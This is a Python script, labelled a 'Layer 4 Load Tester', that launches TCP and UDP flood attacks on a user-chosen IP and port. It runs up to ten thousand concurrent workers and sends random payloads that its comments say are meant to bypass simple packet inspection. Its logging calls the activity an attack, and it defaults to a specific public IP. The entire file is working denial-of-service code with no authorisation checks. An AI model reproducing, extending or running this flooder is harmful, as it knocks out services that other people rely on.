    import asyncio
    import random
    import socket
    import logging
    import sys

    # Configure logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    async def tcp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
        while True:
            try:
                async with semaphore:
                    reader, writer = await asyncio.open_connection(target_ip, target_port)
                    try:
                        # Blast the payload continuously
                        for _ in range(100):
                            writer.write(payload)
                            await writer.drain()
                            
                        # Log occasionally
                        if random.random() < 0.01:
                            logging.info(f"[L4 TCP] Worker {worker_id} successfully blasted {len(payload)*100} bytes.")
                    except Exception:
                        pass
                    finally:
                        writer.close()
                        await writer.wait_closed()
            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(0.01)

    async def udp_flood_worker(target_ip, target_port, payload, semaphore, worker_id):
        while True:
            try:
                async with semaphore:
                    # UDP is connectionless, so we use raw sockets for max speed
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    # Non-blocking socket
                    sock.setblocking(False)
                    
                    # Get the event loop
                    loop = asyncio.get_running_loop()
                    
                    for _ in range(1000): # Huge burst
                        try:
                            # Send UDP packet using asyncio to avoid blocking
                            await loop.sock_sendto(sock, payload, (target_ip, target_port))
                        except BlockingIOError:
                            await asyncio.sleep(0.001)
                        except Exception:
                            break
                            
                    if random.random() < 0.02:
                            logging.info(f"[L4 UDP] Worker {worker_id} successfully sent UDP burst.")
                    sock.close()
            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(0.01)

    async def main():
        print("--- Layer 4 Load Tester (Hibernet-Level Power) ---")
        target_ip = input("Insert Target IP (e.g. 45.139.132.87): ").strip() or "45.139.132.87"
        target_port_input = input("Insert Target Port (e.g. 80): ").strip() or "80"
        target_port = int(target_port_input)
        method = (input("Select Method (TCP/UDP, default UDP): ").strip() or "UDP").upper()
        threads_input = input("Insert number of async workers (default 10000): ").strip() or "10000"
        threads = int(threads_input)
        packet_size_input = input("Insert Payload Size in bytes (default 4096): ").strip() or "4096"
        packet_size = int(packet_size_input)
        
        # Generate random garbage payload to bypass simple packet inspection
        payload = random.randbytes(packet_size)
        
        # Massive concurrency limit for L4 (OS network stack limit)
        conn_limit = min(threads, 20000)
        semaphore = asyncio.Semaphore(conn_limit)
        
        tasks = []
        logging.info(f"Starting L4 {method} attack on {target_ip}:{target_port} with {threads} workers...")
        
        for x in range(threads):
            if method == 'UDP':
                tasks.append(asyncio.create_task(udp_flood_worker(target_ip, target_port, payload, semaphore, x+1)))
            else:
                tasks.append(asyncio.create_task(tcp_flood_worker(target_ip, target_port, payload, semaphore, x+1)))
                
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            logging.info("Attack successfully cancelled.")

    if __name__ == '__main__':
        try:
            if sys.platform == 'win32':
                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            asyncio.run(main())
        except KeyboardInterrupt:
            print("\nStopped by user.")
            sys.exit(0)
            